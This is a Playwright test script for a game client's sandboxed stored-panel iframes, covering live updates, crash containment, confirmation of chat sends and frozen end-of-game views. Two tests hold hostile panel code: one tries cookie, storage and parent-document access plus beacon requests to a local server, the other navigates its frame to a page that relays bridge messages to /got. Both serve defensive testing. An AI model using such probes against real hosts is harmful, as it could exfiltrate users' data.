/**
 * Stored panels in the hosted player client (/player/ on the engine's site), in a real browser.
 *
 *   pnpm --filter @workspace/player-web e2e:panels
 *
 * Needs a running local engine (`pnpm --filter @workspace/engine dev`); CG_TEST_CLOUD_URL, CG_TEST_SITE_URL and
 * CG_TEST_OIDC_URL name its ports (defaults 3210 / 3211 / 3399). It uploads a fresh build of the player client
 * first (CG_E2E_SKIP_DEPLOY=1 skips that). Playwright must be resolvable (e.g. NODE_PATH to a global install).
 *
 * What it checks (each line printed as ok / FAIL):
 *   a panel saved with panels.save and opened as a pane from the panel menu appears without a reload (a window marker
 *   survives), with live data over the bridge, also when the frame is served from another origin than its CSP
 *   names (a custom domain); a pane opened through the engine's layout reaches the page; an update and a rollback
 *   change it live; moving the pane does not restart its frame; a render-throwing version stays inside its frame; a panel
 *   that tries fetch, parent.document, cookies, storage and image/style/script beacons gets nothing (a local
 *   beacon server sees no request); a panel navigating its frame away is stopped and the page it loads hears
 *   nothing (with and without the page CSP); a chat from a panel shows the host's confirmation with the exact
 *   payload and nothing is sent until confirmed (and nothing when cancelled); the evaluator in a frame scores like
 *   the engine; after the game ends every built-in panel shows the frozen final state (none blank) and the forge says
 *   why it is read-only; at phone size (390×844) a panel pane runs in the stacked layout; ?panels=off loads only the
 *   built-in panels and the assistant; the page CSP reports nothing of its own and sign-in still works.
 */
import "../../engine/scripts/local-only.mjs";   // refuses to run with CONVEX_DEPLOY_KEY set
import { execFileSync } from "node:child_process";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "../../..");
const ENGINE = join(ROOT, "artifacts/engine");
const CLOUD = process.env.CG_TEST_CLOUD_URL ??= "http://127.0.0.1:3210";
const SITE = process.env.CG_TEST_SITE_URL ??= "http://127.0.0.1:3211";
process.env.CG_TEST_OIDC_URL ??= "http://127.0.0.1:3399";

const results: { name: string; ok: boolean; detail?: string }[] = [];
async function check(name: string, run: () => Promise<unknown> | unknown) {
  try { await run(); results.push({ name, ok: true }); console.log(`ok   ${name}`); }
  catch (error) { const detail = (error as Error).message.split("\n")[0]; results.push({ name, ok: false, detail }); console.log(`FAIL ${name}: ${detail}`); }
}
function assert(condition: unknown, message: string): asserts condition { if (!condition) throw new Error(message); }
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));
async function until<T>(read: () => Promise<T | undefined>, label: string, ms = 60_000): Promise<T> {
  for (const end = Date.now() + ms; Date.now() < end; await sleep(500)) { const value = await read(); if (value) return value; }
  throw new Error(`timed out: ${label}`);
}

if (!(await fetch(`${SITE}/api/health`).then(r => r.ok, () => false))) {
  console.error(`No engine at ${SITE}. Start one: pnpm --filter @workspace/engine dev`);
  process.exit(1);
}
const anonymous = { ...process.env, CONVEX_AGENT_MODE: "anonymous" };
if (process.env.CG_E2E_SKIP_DEPLOY !== "1") {
  console.log("building and uploading the player client…");
  execFileSync("node", ["scripts/deploy-static.mjs", "--only", "player"], { cwd: ENGINE, stdio: "ignore", env: anonymous });
}

// A beacon server: any request reaching it is a leak. /nav is a page a panel may navigate its own frame to: it
// tries to speak the bridge with the nonce it was handed and reports anything it hears back to /got.
const hits: string[] = [];
const NAV_PAGE = `<!doctype html><script>
const nonce = new URLSearchParams(location.hash.slice(1)).get("n");
addEventListener("message", e => { fetch("/got?" + encodeURIComponent(JSON.stringify(e.data).slice(0, 200))); });
parent.postMessage({ type: "ready", nonce }, "*");
parent.postMessage({ type: "subscribe", id: "x", name: "player.observation", args: {}, nonce }, "*");
parent.postMessage({ type: "command", id: "c", envelope: { command: { type: "ready", ready: true } }, nonce }, "*");
</script>`;
const beacon = createServer((req, res) => {
  hits.push(req.url ?? "");
  if (req.url?.startsWith("/nav")) { res.setHeader("content-type", "text/html"); res.end(NAV_PAGE); } else res.end("leak");
});
await new Promise<void>(r => beacon.listen(0, "127.0.0.1", r));
const BEACON = `http://127.0.0.1:${(beacon.address() as { port: number }).port}`;

const { browserJwt, login } = await import("../../engine/test/helpers.ts");
const { ConvexHttpClient } = await import("convex/browser");
const { makeFunctionReference } = await import("convex/server");
const fn = { q: (n: string) => makeFunctionReference<"query">(n), m: (n: string) => makeFunctionReference<"mutation">(n), a: (n: string) => makeFunctionReference<"action">(n) };

const { session } = await login("carol");
/** carol's Better Auth cookies (login's `session` is the cookie header her sign-in produced). */
const sessionCookies = (header: string) => header.split("; ").map(pair => ({ name: pair.slice(0, pair.indexOf("=")), value: pair.slice(pair.indexOf("=") + 1), url: SITE }));
const carol = new ConvexHttpClient(CLOUD);
carol.setAuth(await browserJwt(session));
const { roomId, shortCode } = await carol.mutation(fn.m("rooms:create"), {}) as { roomId: string; shortCode: string };
// Earlier runs' panels of this identity would crowd the dock: start clean.
for (const p of await carol.query(fn.q("panels:list"), {}) as { slug: string }[]) await carol.mutation(fn.m("panels:remove"), { slug: p.slug });

const { DEFAULT_LAYOUT, openPane } = await import("@workspace/player-client/layout");
type Layout = ReturnType<typeof DEFAULT_LAYOUT>;
// Layouts follow the human across rooms: start this room from the default arrangement.
await carol.mutation(fn.m("layout:set"), { roomId, layout: DEFAULT_LAYOUT("lobby") });

/** Open a stored panel as a pane through the engine's layout, as the assistant's open_panel does (the page follows). */
async function openAsPane(slug: string) {
  const { layout } = await carol.query(fn.q("layout:current"), { roomId }) as { layout: Layout };
  if (Object.values(layout.panes).some(p => p.kind === "stored-panel" && p.slug === slug)) return;
  await carol.mutation(fn.m("layout:set"), { roomId, layout: openPane(layout, { id: "", kind: "stored-panel", slug }).layout });
}
/** Save a panel (and open it as a pane unless told not to). */
async function save(slug: string, source: string, { open = true } = {}) {
  const result = await carol.action(fn.a("panels:save"), { slug, source }) as { ok: boolean; version?: number; diagnostics: unknown[] };
  assert(result.ok, `save ${slug}: ${JSON.stringify(result.diagnostics)}`);
  if (open) await openAsPane(slug);
  return result.version!;
}
const live = (label: string) => `import { definePanel, useGame } from "@sdk";
export default definePanel({ title: "E2E live", placement: "left", Component() {
  const game = useGame({ hz: 2 });
  return <p data-testid="sp-text">${label} {game ? "with data" : "loading"}</p>;
} });
`;

const { chromium } = createRequire(import.meta.url)("playwright") as typeof import("playwright");
const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 1500, height: 1000 } });
await context.addCookies(sessionCookies(session));
const page = await context.newPage();
const pageErrors: string[] = [];
const cspReports: string[] = [];
page.on("pageerror", e => pageErrors.push(e.message));
// The host page's own CSP reports (the frames' refusals are expected: the hostile panel provokes them).
page.on("console", m => { if (/Content Security Policy/i.test(m.text()) && !/panel-(runtime|frame)|^panel:/.test(m.location().url)) cspReports.push(`${m.location().url}: ${m.text()}`); });
let navigations = 0;
page.on("framenavigated", f => { if (f === page.mainFrame()) navigations++; });
await page.goto(`${SITE}/player/?room=${shortCode}`);
await page.waitForSelector("[data-testid=text-self-label]", { timeout: 60_000 });
await page.evaluate(() => { (window as unknown as { __cgMarker: number }).__cgMarker = 42; });
const sameDocument = async () => navigations === 1 && await page.evaluate(() => (window as unknown as { __cgMarker?: number }).__cgMarker === 42);
const frame = (slug: string) => page.frameLocator(`[data-testid="panel-frame-stored:${slug}"] iframe`);
const frameText = (slug: string, testId: string) => frame(slug).locator(`[data-testid=${testId}]`).textContent({ timeout: 30_000 });
async function frameShows(slug: string, testId: string, expected: RegExp) {
  const end = Date.now() + 30_000;
  for (;;) {
    const text = await frameText(slug, testId).catch(() => null);
    if (text && expected.test(text)) return text;
    if (Date.now() > end) throw new Error(`${slug}: ${testId} shows ${JSON.stringify(text)}, expected ${expected}`);
    await sleep(250);
  }
}

await check("a panel saved with panels.save and opened from the panel menu appears without a reload, with live data over the bridge", async () => {
  assert(await save("e2e-live", live("v1"), { open: false }) === 1, "first version");
  // "Your panels" in a built-in panel's menu opens it as a pane of its own.
  await page.locator("[data-testid=menu-panel]").first().click();
  await page.click("[data-testid=menu-stored-panel-e2e-live]", { timeout: 15_000 });
  await frameShows("e2e-live", "sp-text", /^v1 with data$/);
  assert(await page.textContent("[data-testid=badge-stored-e2e-live]") === "stored v1", "version badge");
  assert(await page.getAttribute('[data-testid="panel-frame-stored:e2e-live"] iframe', "sandbox") === "allow-scripts", "sandbox attribute");
  assert(await sameDocument(), "the page reloaded");
});

await check("an update and a rollback change the panel live", async () => {
  await save("e2e-live", live("v2"));
  await frameShows("e2e-live", "sp-text", /^v2 with data$/);
  await carol.mutation(fn.m("panels:rollback"), { slug: "e2e-live", version: 1 });
  await frameShows("e2e-live", "sp-text", /^v1 with data$/);
  await page.waitForFunction(() => document.querySelector("[data-testid=badge-stored-e2e-live]")?.textContent === "stored v3", null, { timeout: 15_000 });
  assert(await sameDocument(), "the page reloaded");
});

await check("moving a panel's pane (the assistant to the right) does not restart its frame", async () => {
  await page.keyboard.press("Control+k");
  await page.waitForSelector("[data-testid=dialog-palette]");
  await page.keyboard.type("Move assistant right");
  await page.keyboard.press("Enter");
  await sleep(1500);
  assert(await page.getAttribute('[data-testid="panel-frame-stored:e2e-live"]', "data-frame-state") !== "navigated", "the moved frame was stopped as a navigation");
  await frameShows("e2e-live", "sp-text", /^v1 with data$/);
  await page.keyboard.press("Control+k");
  await page.keyboard.type("Move assistant to the bottom");
  await page.keyboard.press("Enter");
  await sleep(500);
});

await check("a panel still runs when its frame CSP names another site origin (a custom domain): 'self' admits the runtime", async () => {
  // Served from a custom domain, the frame's URL is not the deployment's .convex.site that its CSP names. A document
  // served through route.fulfill has no address, so Chromium's local-network checks would block its loopback
  // runtime: this browser runs without them (as in the no-CSP check below).
  const lax = await chromium.launch({ args: ["--disable-features=LocalNetworkAccessChecks"] });
  const laxContext = await lax.newContext();
  await laxContext.addCookies(sessionCookies(session));
  const custom = await laxContext.newPage();
  const customLog: string[] = [];
  custom.on("console", m => customLog.push(m.text().slice(0, 200)));
  await custom.route(url => url.pathname === "/player/panel-frame.html", async route => {
    const response = await route.fetch();
    const body = (await response.text()).replaceAll(new URL(SITE).origin, "https://custom-domain.example");
    assert(body.includes("https://custom-domain.example"), "the frame CSP names the site origin");
    await route.fulfill({ response, body });
  });
  await custom.goto(`${SITE}/player/?room=${shortCode}`);
  const end = Date.now() + 30_000;
  for (;;) {
    const text = await custom.frameLocator('[data-testid="panel-frame-stored:e2e-live"] iframe').locator("[data-testid=sp-text]").textContent({ timeout: 30_000 }).catch(() => null);
    if (text === "v1 with data") break;
    if (Date.now() > end) throw new Error(`custom-domain frame shows ${JSON.stringify(text)}; state ${await custom.getAttribute('[data-testid="panel-frame-stored:e2e-live"]', "data-frame-state").catch(() => "none")}; log ${customLog.slice(0, 6).join(" | ")}`);
    await sleep(250);
  }
  assert(!customLog.some(t => /Content Security Policy/i.test(t)), `CSP refused the runtime: ${customLog.join(" | ")}`);
  await lax.close();
});

await check("a render-throwing version stays inside its frame", async () => {
  await save("e2e-throws", `import { definePanel } from "@sdk";\nexport default definePanel({ title: "Throws", Component() { throw new Error("kaboom in render"); } });\n`);
  const end = Date.now() + 30_000;
  for (;;) {
    const text = await frame("e2e-throws").locator("[role=alert]").textContent({ timeout: 30_000 }).catch(() => "");
    if (/crashed while rendering/.test(text ?? "") && /kaboom in render/.test(text ?? "")) break;
    if (Date.now() > end) throw new Error(`no crash message in the frame: ${text}`);
    await sleep(250);
  }
  await frameShows("e2e-live", "sp-text", /^v1 with data$/);
  assert(await page.isVisible("[data-testid=text-self-label]"), "the core console is still there");
  assert(await sameDocument(), "the page reloaded");
});

await check("a hostile panel gets nothing: no fetch, no parent.document, no cookies or storage, no beacons", async () => {
  await save("e2e-hostile", `import { useEffect, useState } from "react";
import { definePanel } from "@sdk";
const BEACON = ${JSON.stringify(BEACON)};
export default definePanel({ title: "Hostile", Component() {
  const [r, setR] = useState<Record<string, string>>({});
  useEffect(() => {
    const set = (k: string, v: string) => setR(x => ({ ...x, [k]: v }));
    fetch("/api/health").then(() => set("fetch", "LEAK"), () => set("fetch", "blocked"));
    fetch(BEACON + "/fetch").then(() => set("fetchBeacon", "LEAK"), () => set("fetchBeacon", "blocked"));
    try { set("parent", "LEAK " + (parent as Window).document.title); } catch { set("parent", "blocked"); }
    try { set("cookie", document.cookie ? "LEAK" : "empty"); } catch { set("cookie", "blocked"); }
    try { localStorage.getItem("cg.layout.v1"); set("storage", "LEAK"); } catch { set("storage", "blocked"); }
    const img = new Image(); img.onload = () => set("img", "LEAK"); img.onerror = () => set("img", "blocked"); img.src = BEACON + "/img";
    const css = document.createElement("link"); css.rel = "stylesheet"; css.href = BEACON + "/css"; document.head.appendChild(css);
    const js = document.createElement("script"); js.src = BEACON + "/js"; document.head.appendChild(js);
    try { new WebSocket(BEACON.replace("http", "ws") + "/ws"); } catch { /* blocked */ }
  }, []);
  return <pre data-testid="sp-hostile">{JSON.stringify(r)}</pre>;
} });
`);
  const text = await frameShows("e2e-hostile", "sp-hostile", /"img":/);
  const r = JSON.parse(text) as Record<string, string>;
  for (const key of ["fetch", "fetchBeacon", "parent", "storage", "img"]) assert(r[key] === "blocked", `${key}: ${r[key]} (${text})`);
  assert(r.cookie !== "LEAK", `cookie: ${r.cookie}`);
  await sleep(1500);
  assert(hits.length === 0, `the beacon server was reached: ${hits.join(", ")}`);
});

await check("a panel that navigates its own frame away is stopped; the page it loads hears nothing from the bridge", async () => {
  // The frame's own CSP cannot stop it navigating itself; the hosted page's `frame-src 'self'` does (it governs
  // navigations of its child frames), so the request never leaves; a dev server's page has the same frame-src
  // (vite/csp.ts devPageCsp). Without any page CSP, the page the frame loads must still hear nothing: it does not
  // own the bridge's MessagePort (defence in depth).
  hits.length = 0;
  await save("e2e-navigates", `import { useEffect } from "react";
import { definePanel } from "@sdk";
export default definePanel({ title: "Navigates", Component() {
  useEffect(() => { const t = setTimeout(() => { location.href = ${JSON.stringify(BEACON)} + "/nav" + location.hash; }, 300); return () => clearTimeout(t); }, []);
  return <p>leaving</p>;
} });
`);
  await page.waitForSelector('[data-testid="panel-error-stored:e2e-navigates"]', { timeout: 30_000 });
  assert(/navigate away/.test(await page.textContent('[data-testid="panel-error-stored:e2e-navigates"]') ?? ""), "stopped message");
  await sleep(2000);
  assert(!hits.some(h => h.startsWith("/nav")), "the navigation reached its target despite the page's frame-src");
  assert(!hits.some(h => h.startsWith("/got")), "the navigated page heard the bridge");

  // The same page with its CSP stripped: the navigation happens, the new page still hears nothing.
  // A page served through route.fulfill has no address, so Chromium's local-network checks would block its
  // WebSocket to the local engine: this one browser runs without them.
  const lax = await chromium.launch({ args: ["--disable-features=LocalNetworkAccessChecks"] });
  const laxContext = await lax.newContext();
  await laxContext.addCookies(sessionCookies(session));
  const bare = await laxContext.newPage();
  const bareLog: string[] = [];
  bare.on("console", m => bareLog.push(m.text().slice(0, 150)));
  bare.on("pageerror", e => bareLog.push("pageerror " + e.message.slice(0, 150)));
  await bare.route(url => url.pathname === "/player/", async route => {
    const response = await route.fetch();
    await route.fulfill({ response, body: (await response.text()).replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, "") });
  });
  await bare.goto(`${SITE}/player/?room=${shortCode}`);
  await bare.waitForSelector('[data-testid="panel-error-stored:e2e-navigates"]', { timeout: 60_000 }).catch(async error => {
    throw new Error(`no CSP: ${(error as Error).message.split("\n")[0]}; hits ${hits.join(", ")}; frame ${await bare.getAttribute('[data-testid="panel-frame-stored:e2e-navigates"]', "data-frame-state").catch(() => "none")}; csp ${await bare.locator('meta[http-equiv="Content-Security-Policy"]').count()}; text ${(await bare.innerText("body")).slice(0, 300).replace(/\s+/g, " ")}; log ${bareLog.slice(0, 5).join(" | ")}`);
  });
  await sleep(2500);
  assert(hits.some(h => h.startsWith("/nav")), `without the page CSP the frame should have navigated: ${hits.join(", ")}`);
  const heard = hits.filter(h => h.startsWith("/got"));
  assert(heard.length === 0, `the navigated page heard: ${heard.map(decodeURIComponent).join(" | ")}`);
  await lax.close();
  await carol.mutation(fn.m("panels:remove"), { slug: "e2e-navigates" });
});

await check("a chat from a panel shows the host's confirmation; nothing is sent until confirmed", async () => {
  const TEXT = `hello from a stored panel ${Date.now()}`;
  await save("e2e-chat", `import { useState } from "react";
import { definePanel, useActions } from "@sdk";
export default definePanel({ title: "Chatty", Component() {
  const actions = useActions();
  const [r, setR] = useState("idle");
  const send = () => actions.chat(${JSON.stringify(TEXT)}).then(x => setR(x.accepted ? "accepted" : "refused " + x.message), e => setR("error " + e.message));
  return <div><button data-testid="sp-chat" onClick={send}>chat</button><span data-testid="sp-chat-result">{r}</span></div>;
} });
`);
  const chatted = async () => (await carol.query(fn.q("rooms:chatHistory"), { roomId }) as { text: string }[]).some(m => m.text === TEXT);
  await frame("e2e-chat").locator("[data-testid=sp-chat]").click({ timeout: 30_000 });
  await page.waitForSelector("[data-testid=dialog-panel-action]", { timeout: 15_000 });
  const payload = await page.textContent("[data-testid=text-panel-action-payload]");
  assert(payload?.includes(TEXT) && payload.includes('"type": "chat"'), `payload: ${payload}`);
  await sleep(1500);
  assert(!(await chatted()), "the chat was sent before the player confirmed");
  await page.click("[data-testid=button-panel-action-cancel]");
  await frameShows("e2e-chat", "sp-chat-result", /^error The player declined/);
  assert(!(await chatted()), "a cancelled chat was sent");
  await frame("e2e-chat").locator("[data-testid=sp-chat]").click();
  await page.waitForSelector("[data-testid=dialog-panel-action]", { timeout: 15_000 });
  await page.click("[data-testid=button-panel-action-confirm]");
  await frameShows("e2e-chat", "sp-chat-result", /^accepted$/);
  assert(await chatted(), "the confirmed chat did not arrive");
});

await check("the evaluator works in a frame: calibration tables arrive over the bridge, scores match the engine's", async () => {
  const owner = (action: string, extra: Record<string, unknown> = {}) =>
    carol.action(fn.a("owner:command"), { roomId, action, requestId: crypto.randomUUID(), ...extra });
  // A game needs three gods: carol and two (mock) AI seats.
  await owner("addAi", { aiAgentId: "sonnet-strategist" });
  await owner("addAi", { aiAgentId: "sonnet-strategist" });
  await owner("settings", { aiBudget: 50_000, revision: (await carol.query(fn.q("rooms:get"), { room: roomId }) as { revision: number }).revision });
  await owner("start");
  await save("e2e-eval", `import { definePanel, useEvaluator, useObjects } from "@sdk";
export default definePanel({ title: "Evaluator", Component() {
  const evaluator = useEvaluator();
  const objects = useObjects({ hz: 1 });
  if (!evaluator) return <p data-testid="sp-eval">loading</p>;
  if (!objects.length) return <p data-testid="sp-eval">no objects</p>;
  const same = objects.every(o => Math.abs(evaluator.score(o.value).netBits - o.own.netBits) < 1e-9);
  return <p data-testid="sp-eval">{same ? "match" : "mismatch"} {objects.length}</p>;
} });
`);
  await frameShows("e2e-eval", "sp-eval", /^(match|mismatch) \d+$|^no objects$/);
  // Objects spawn once the game runs; wait for some, then every local score must equal the engine's.
  const text = await (async () => { for (let i = 0; i < 4; i++) { try { return await frameShows("e2e-eval", "sp-eval", /^(match|mismatch) \d+$/); } catch { /* still planning */ } } return frameText("e2e-eval", "sp-eval"); })();
  assert(/^match \d+$/.test(text ?? ""), `evaluator: ${text}`);
});

await check("after the game ends every built-in panel shows the frozen final state (no placeholder), the forge says why it is read-only", async () => {
  const owner = (action: string, extra: Record<string, unknown> = {}) =>
    carol.action(fn.a("owner:command"), { roomId, action, requestId: crypto.randomUUID(), ...extra });
  type Obs = { gameId: string; language: "python" | "typescript"; instance: { objectType: string }; objects: { id: string }[]; agents: unknown[]; transformations: { calls?: [string, Record<string, unknown>][] }[] };
  const observe = () => carol.query(fn.q("player:observation"), { roomId, at: Date.now() }) as Promise<Obs>;
  let obs = await observe();
  const AGENT: Record<string, Record<string, string>> = {
    python: { Int: "def agent(x):\n    return [add(1)]", string: "def agent(s):\n    return [swap_chars(0, 1)]", Grid: "def agent(grid):\n    return [slide(row(0), 1)]" },
    typescript: { Int: "function agent(x) { return [add(1)]; }", string: "function agent(s) { return [swapChars(0, 1)]; }", Grid: "function agent(grid) { return [slide(row(0), 1)]; }" },
  };
  // The game ends whatever happens here: the checks after this one expect an ended game.
  try {
    const source = AGENT[obs.language][obs.instance.objectType];
    assert(source, `no agent source for ${obs.language} ${obs.instance.objectType}`);
    const summon = await carol.action(fn.a("commands:submit"), { roomId, envelope: { version: "code-gods.player.v3", commandId: crypto.randomUUID(), gameId: obs.gameId,
      command: { type: "summon", language: obs.language, source } } }) as { accepted: boolean; message?: string };
    assert(summon.accepted, `summon: ${summon.message}`);
    obs = await until(async () => { const o = await observe(); return o.transformations.some(t => t.calls?.length) ? o : undefined; }, "carol's agent acts", 120_000);
  } finally { await owner("endGame"); }
  await page.waitForFunction(() => /ended/i.test(document.querySelector("[data-testid=text-phase]")?.textContent ?? ""), null, { timeout: 30_000 });
  const whatIf = { objectId: obs.objects[0].id, calls: [obs.transformations.find(t => t.calls?.length)!.calls![0]] };
  /** Each panel's own content, as it renders with data (any one selector). */
  const CONTENT: Record<string, string> = {
    overview: "[data-testid=panel-overview]", "my-card": "[data-testid=panel-utility]", objects: "[data-testid^=row-object-]", "others-care": "[data-testid=panel-others-care]",
    "bits-over-time": "[data-testid=panel-bits-over-time]", race: "[data-testid^=row-leader-]", agents: "[data-testid^=row-agent-]", feed: "[data-testid^=row-transformation-]",
    "what-if": "[data-testid=panel-what-if]", "public-chat": "[data-testid^=row-chat-]", forge: "[data-testid=text-forge-ended]", results: "[data-testid=panel-results]", rules: "[data-testid=panel-rules]",
    "code-output": "[data-testid=table-code-result]",
  };
  const { PANEL_IDS } = await import("@workspace/player-client/panels");
  assert(PANEL_IDS.length === 14 && PANEL_IDS.every(id => CONTENT[id]), "a content selector for each built-in panel");
  // Code results show carol's latest analytics run: one through the assistant (mock provider) over the frozen objects.
  // The AI seats keep the budget the evaluator check gave them (a later check starts another game with them).
  await carol.mutation(fn.m("rooms:approveAiBudget"), { roomId, aiBudget: 50_000, assistantBudget: 400_000 });
  const rank = "def main(data):\n    rows = sorted(data['objects'], key=lambda o: -o['payoff'])[:5]\n    return [{'object': o['id'], 'payoff': round(o['payoff'], 2)} for o in rows]\n";
  const sent = await carol.mutation(fn.m("assistant:send"), { roomId, text: `/mock ${JSON.stringify({ steps: [
    { tools: [{ name: "run_code", input: { language: "python", source: rank, datasets: ["objects"], title: "Top 5 by payoff" } }] }, { text: "Done." }] })}` }) as { threadId: string; turnId: string };
  await until(async () => {
    const t = await carol.query(fn.q("assistant:thread"), { threadId: sent.threadId }) as { turns: { _id: string; status: string }[] };
    const turn = t.turns.find(x => x._id === sent.turnId);
    if (turn && turn.status !== "running") { assert(turn.status === "done", `the code turn ended ${turn.status}`); return true; }
    return undefined;
  }, "carol's code run", 90_000);
  // layout:set allows 12 changes a minute: a sweep of 14 panels waits for the window instead of failing.
  const setLayout = (layout: Layout) => until(() => carol.mutation(fn.m("layout:set"), { roomId, layout }).then(() => true, (e: Error) => {
    if (/RATE_LIMITED/.test(e.message)) return sleep(4_000).then(() => undefined);
    throw e;
  }), "layout:set", 120_000);
  const show = (panelId: string) => {
    const layout = DEFAULT_LAYOUT("ended");
    layout.panes.p1 = { id: "p1", kind: "panel", panelId: panelId as never, params: panelId === "what-if" ? whatIf : {}, setBy: "human" };
    return setLayout(layout);
  };
  // The checks after this one use carol's arrangement (her stored panels' panes): put it back at the end.
  const arranged = (await carol.query(fn.q("layout:current"), { roomId }) as { layout: Layout }).layout;
  try { await sweep(); } finally { await setLayout(arranged); }
  async function sweep() {
  const blank: string[] = [];
  for (const id of PANEL_IDS) {
    await show(id);
    const pane = page.locator("[data-testid=pane-p1]");
    const ok = await pane.locator(CONTENT[id]).first().waitFor({ state: "attached", timeout: 20_000 }).then(() => true, () => false);
    const text = (await pane.textContent()) ?? "";
    if (!ok || await pane.locator("[data-testid^=panel-empty-]").count() > 0 || /shows data|How the game went\.$/.test(text)) blank.push(`${id}: ${text.slice(0, 120)}`);
  }
  assert(blank.length === 0, `blank after the end: ${blank.join(" | ")}`);
  await show("forge");
  await page.locator("[data-testid=pane-p1] [data-testid=input-source]").fill("def agent(x):\n    return []");
  assert(await page.locator("[data-testid=pane-p1] [data-testid=button-summon]").isDisabled() && await page.locator("[data-testid=pane-p1] [data-testid=button-validate]").isDisabled(), "summon and validate are off after the end");
  // Phone-size screenshots of the frozen agents, objects and feed panels (CG_E2E_SHOTS=<dir> keeps them).
  if (process.env.CG_E2E_SHOTS) {
    const phone = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });
    await phone.addCookies(sessionCookies(session));
    const shot = await phone.newPage();
    await shot.goto(`${SITE}/player/?room=${shortCode}`);
    await shot.waitForSelector("[data-testid=dock-stacked]", { state: "attached", timeout: 60_000 });
    for (const id of ["agents", "objects", "feed"]) {
      await show(id);
      await shot.locator(`[data-testid=pane-p1] ${CONTENT[id]}`).first().waitFor({ state: "attached", timeout: 20_000 }).catch(() => {});
      await sleep(800);
      await shot.screenshot({ path: join(process.env.CG_E2E_SHOTS, `ended-${id}-after.png`) });
    }
    await phone.close();
  }
  }
});

await check("while the next game prepares its rule tables (a shape with no shipped file), the overview and results panels say so with the progress", async () => {
  const owner = (action: string, extra: Record<string, unknown> = {}) => carol.action(fn.a("owner:command"), { roomId, action, requestId: crypto.randomUUID(), ...extra });
  const { canonicalSupport, context, familiesFor, firstUseSeconds, instantiateKey, paramsKey, tableKey } = await import("@workspace/game-utilities");
  const inst = instantiateKey("Int(0,2147483647)");
  const smooth = familiesFor("Int", "reward").find(f => f.id === "smooth-operator")!;
  const convex = (fnName: string, args: unknown) => execFileSync("npx", ["convex", "run", fnName, JSON.stringify(args)], { cwd: ENGINE, encoding: "utf8" });
  convex("calibration/cache:forget", { instance: inst.key });
  // The three tables are claimed as if computing elsewhere: the room waits on them, nothing is computed here.
  for (const p of canonicalSupport(smooth, context(inst))) {
    convex("calibration/cache:claim", { key: tableKey(smooth.id, p, inst), instance: inst.key, family: smooth.id, paramsKey: paramsKey(p), prior: "uniform" });
  }
  const { revision } = await carol.query(fn.q("rooms:get"), { room: roomId }) as { revision: number };
  await owner("settings", { revision, settings: { objectType: "Int", typeArgs: { min: 0, max: 2147483647 }, languages: ["typescript"],
    excludedFamilies: familiesFor("Int", "reward").map(f => f.id).filter(id => id !== smooth.id) } });
  const started = await owner("start") as { status?: string; message?: string };
  assert(started.status === "preparing" && /preparing its rule tables: 0 of 3 ready/.test(started.message ?? ""), `start: ${JSON.stringify(started)}`);
  const note = page.locator("[data-testid=note-preparing]").first();
  await note.waitFor({ timeout: 30_000 });
  const text = await note.innerText();
  assert(new RegExp(`The game is preparing its rule tables, 0 of 3 ready\\. It is the first game on Int\\(0,2147483647\\) on this server \\(about ${firstUseSeconds(inst)} s\\)`).test(text), `note: ${text}`);
  await owner("endGame");   // ends the preparation
  await page.locator("[data-testid=note-preparing]").first().waitFor({ state: "detached", timeout: 30_000 });
  convex("calibration/cache:forget", { instance: inst.key });
});

await check("at phone size (390×844) a panel's pane runs in the stacked layout, with the assistant as a sheet", async () => {
  const phoneContext = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });
  await phoneContext.addCookies(sessionCookies(session));
  const phone = await phoneContext.newPage();
  phone.on("pageerror", e => pageErrors.push(`phone: ${e.message}`));
  await phone.goto(`${SITE}/player/?room=${shortCode}`);
  await phone.waitForSelector("[data-testid=dock-stacked] [data-testid=assistant-pane]", { state: "attached", timeout: 60_000 });
  const text = await phone.frameLocator('[data-testid="panel-frame-stored:e2e-live"] iframe').locator("[data-testid=sp-text]").textContent({ timeout: 30_000 });
  assert(text === "v1 with data", `phone frame: ${text}`);
  assert(await phone.locator(".dv-dockview").count() === 0, "dockview on a phone");
  const width = await phone.evaluate(() => document.scrollingElement!.scrollWidth);
  assert(width <= 390, `the page scrolls sideways: ${width}px`);
  await phoneContext.close();
});

await check("a Grid game's objects panel at phone size: no ✓/✗ glyphs, rectangles to scale with labelled edges, the top bar at the ramp's strong end, no sideways scroll", async () => {
  const owner = (action: string, extra: Record<string, unknown> = {}) => carol.action(fn.a("owner:command"), { roomId, action, requestId: crypto.randomUUID(), ...extra });
  const { revision } = await carol.query(fn.q("rooms:get"), { room: roomId }) as { revision: number };
  await owner("settings", { revision, settings: { objectType: "Grid", languages: ["typescript"], planningSeconds: 2, halfLifeSeconds: 3600 } });
  await owner("start");
  const { layout } = await carol.query(fn.q("layout:current"), { roomId }) as { layout: Layout };
  await carol.mutation(fn.m("layout:set"), { roomId, layout: { ...layout, panes: { ...layout.panes, p1: { id: "p1", kind: "panel", panelId: "objects", params: {}, setBy: "human" } } } });
  const phoneContext = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });
  await phoneContext.addCookies(sessionCookies(session));
  const phone = await phoneContext.newPage();
  phone.on("pageerror", e => pageErrors.push(`phone: ${e.message}`));
  await phone.goto(`${SITE}/player/?room=${shortCode}`);
  await phone.waitForSelector("[data-testid^=row-object-]", { timeout: 90_000 });
  const panel = await phone.evaluate(() => {
    const rows = [...document.querySelectorAll("[data-testid^=row-object-]")];
    const list = rows[0].closest("ol")!.parentElement!;
    return {
      text: list.textContent ?? "",
      rects: [...list.querySelectorAll("svg[data-testid^=payoff-rect-]")].map(r => ({
        kind: r.getAttribute("data-kind"), w: Number(r.getAttribute("data-width")), h: Number(r.getAttribute("data-height")),
        yours: Number(r.querySelector("[data-testid=payoff-label-yours]")?.textContent), others: Number(r.querySelector("[data-testid=payoff-label-others]")?.textContent),
      })),
      topBar: getComputedStyle(rows[0].querySelector("[data-testid^=payoff-bar-]")!).backgroundColor,
      scrollWidth: document.scrollingElement!.scrollWidth,
    };
  });
  assert(!/[✓✗]/u.test(panel.text), `glyphs in the objects panel: ${panel.text.match(/.{0,20}[✓✗].{0,20}/u)?.[0]}`);
